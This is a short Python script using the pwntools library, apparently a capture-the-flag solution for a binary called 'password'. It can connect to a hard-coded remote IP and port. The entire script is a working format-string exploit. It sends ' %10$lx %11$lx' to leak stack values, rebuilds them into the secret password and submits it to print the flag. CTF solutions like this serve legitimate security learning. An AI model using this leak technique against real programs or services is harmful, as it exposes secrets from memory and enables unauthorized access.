from pwn import *
import sys

argc = len(sys.argv)
_bin = "./password"
context.binary = _bin
e = ELF(_bin)
rop = ROP(e)
if argc >=2 and '-r' in sys.argv[1]:
    p = remote("3.131.69.179", 15692)
else:
    p = process(_bin)

p.recvline()

payload = " %10$lx %11$lx"
p.sendline(payload)

data = p.recvline().split()

from Crypto.Util.number import *
payload = long_to_bytes(int(data[2]+data[1],16))[::-1]
print(payload)

p.recvuntil("?")
p.sendline(payload)
p.recvline()
print(p.recvline())
print(p.recvline())
